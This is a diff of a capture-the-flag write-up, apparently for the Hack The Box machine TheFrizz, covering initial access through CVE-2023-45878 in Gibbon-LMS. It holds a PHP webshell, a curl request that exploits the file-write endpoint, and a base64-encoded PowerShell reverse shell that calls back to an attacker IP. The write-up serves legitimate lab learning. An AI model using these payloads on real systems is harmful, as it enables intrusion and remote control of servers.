@@ -66,8 +66,8 @@ No additional interesting directories or files were discovered. Enumeration shif
 
 ## Initial Access (Web → RCE)
 ### CVE-2023-45878 — Gibbon-LMS Arbitrary File Write  
-The Gibbon-LMS instance is vulnerable to CVE-2023-45878, allowing arbitrary file write via a base64 image upload endpoint.
-Minimal PHP webshell:  
+The Gibbon-LMS instance is vulnerable to CVE-2023-45878, allowing arbitrary file write via a base64 image upload endpoint.  
+Create a minimal PHP webshell:  
 `echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php`
 
 The endpoint expects base64-encoded data, so the file is encoded:  
@@ -78,7 +78,7 @@ The vulnerable endpoint allows writing arbitrary content to disk.
 `curl -s -X POST "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php" -d "img=image/png;asdf,${b64}" -d "path=shell.php" -d "gibbonPersonID=0000000001"`
 ![](assets/img/htb/thefrizz/thefrizz14.png)
 
-Parameter breakdown:
+### Parameter breakdown:
 * `img=image/png;asdf,${b64}`
     The server splits on the comma and base64-decodes the right side, writing it to disk.
 * `path=shell.php`
@@ -87,13 +87,12 @@ Parameter breakdown:
     Required application field influencing save location.
   Successful upload returns the filename:  `shell.php%`
 
-Verify remote code execution
-Access the shell directly:  
-`curl -s -G "http://frizzdc.frizz.htb/Gibbon-LMS/shell.php" --data-urlencode "cmd=whoami"`
+### Verify remote code execution  
+Access the shell directly:  `curl -s -G "http://frizzdc.frizz.htb/Gibbon-LMS/shell.php" --data-urlencode "cmd=whoami"`
 ![](assets/img/htb/thefrizz/thefrizz13.png)
-`frizz\w.webservice`
 This confirms remote command execution on the web server.
 
+### Shell
 A PowerShell reverse shell payload is delivered via the webshell:  
 `curl -s -G "http://frizzdc.frizz.htb/Gibbon-LMS/shell.php" --data-urlencode "cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADcAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`
 ![](assets/img/htb/thefrizz/thefrizz16.png)
